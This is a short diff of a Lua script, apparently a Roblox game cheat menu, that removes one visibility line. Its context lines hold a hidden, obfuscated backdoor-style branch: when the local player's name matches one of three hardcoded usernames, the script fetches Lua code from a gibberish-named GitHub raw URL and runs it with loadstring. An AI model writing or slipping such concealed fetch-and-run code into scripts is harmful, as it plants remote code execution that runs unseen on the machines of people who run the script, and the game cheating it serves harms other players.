@@ -227,7 +227,6 @@ local ewadasdasdasdfa = LIB("Whitelist", {
 	end,
 	["Default"] = false
 })
-Private.SetVisible(false)
 if game.Players.LocalPlayer.Name == 'PistonIsThe' or game.Players.LocalPlayer.Name == 'bedwarsisntcanadian' or game.Players.LocalPlayer.Name == 'FunctionTheNew' then
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/fuahsfpgagfsagf9we8gadsuea/rgaadfgugeoafbvpuga8egfaf/main/fasfuheha79cge7gafafeadfe.lua', true))()
 	local gfhea9fhafwea = LIB("Whitelist", {
